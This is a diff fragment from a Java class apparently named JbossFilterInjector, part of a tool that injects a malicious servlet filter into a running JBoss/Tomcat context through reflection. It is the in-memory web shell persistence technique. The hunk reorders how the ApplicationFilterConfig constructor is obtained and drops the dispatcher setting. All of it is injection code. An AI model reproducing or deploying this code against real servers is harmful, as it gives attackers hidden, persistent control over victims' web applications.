@@ -96,16 +96,15 @@ public class JbossFilterInjector {
         invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
-        invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
-        Constructor<?>[] constructors;
         invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
-        constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
         try {
             invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         } catch (Exception e) {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
 
+        Constructor<?>[] constructors;
+        constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
         constructors[0].setAccessible(true);
         try {
             Object filterConfig = constructors[0].newInstance(context, filterDef);
